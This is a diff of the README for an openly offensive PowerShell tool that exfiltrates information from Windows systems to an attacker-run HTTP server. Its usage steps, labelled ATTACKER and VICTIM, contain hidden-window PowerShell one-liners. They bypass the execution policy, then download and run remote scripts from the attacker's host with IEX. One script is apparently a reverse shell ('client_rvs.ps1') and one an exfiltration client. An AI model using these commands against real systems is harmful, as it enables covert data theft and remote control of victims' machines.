@@ -9,9 +9,10 @@ A PowerShell script to exfiltrate information of a Windows system via HTTP serve
 
 ### Example
 1. Change the listening IP/Port in `server.py` (default is `0.0.0.0:8000`).
-2. Change the IP/port of your Python server in `client.ps1`.
+2. Change the IP/port of your Python server in `client_exf.ps1`.
 3. Run:
 ```
 ATTACKER> python3 server.py
-VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<SERVER-IP>:<SERVER-PORT>/client.ps1');"
+VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<SERVER-IP>:<SERVER-PORT>/client_rvs.ps1');"
+VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<SERVER-IP>:<SERVER-PORT>/client_exf.ps1');"
 ```
